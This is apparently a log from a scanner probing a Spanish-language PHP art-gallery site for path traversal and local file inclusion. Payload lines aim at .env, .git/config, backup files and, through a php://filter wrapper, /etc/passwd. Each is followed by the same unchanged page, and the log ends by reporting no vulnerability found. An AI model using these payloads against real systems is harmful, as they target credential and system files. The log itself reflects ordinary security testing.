            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file_path=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file_path=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file_path=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file_path=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file_path=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>

SUMMARY
VULN_FOUND: false
VULN_EXPLOITED: false
